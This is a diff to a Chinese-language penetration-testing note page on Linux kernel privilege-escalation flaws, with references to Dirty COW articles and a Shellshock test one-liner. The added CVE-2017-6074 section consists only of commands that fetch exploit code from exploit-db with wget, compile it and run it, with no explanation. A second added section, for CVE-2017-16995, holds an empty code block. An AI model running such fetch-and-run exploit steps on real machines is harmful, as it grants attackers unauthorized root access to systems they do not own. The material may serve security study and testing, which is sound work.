@@ -50,6 +50,24 @@ bash -c "f() { x() { _;}; x() { _;} <<a; }" 2>/dev/null || echo vulnerable
 
 **参考：[深度分析“大小脏牛”漏洞：CVE-2016-5195和CVE-2017-1000405](https://www.freebuf.com/articles/network/283313.html)**
 
+## CVE-2017-6074
+
+```bash
+$ wget https://www.exploit-db.com/download/41458 -O /tmp/exp.c
+$ gcc -o exp exp.c
+$ chmod +x exp
+$ ./exp
+
+```
+
+## CVE-2017-16995
+
+```
+
+```
+
+
+
 ## 大脏牛 CVE-2017-1000405
 
 **参考：[深度分析“大小脏牛”漏洞：CVE-2016-5195和CVE-2017-1000405](https://www.freebuf.com/articles/network/283313.html)**
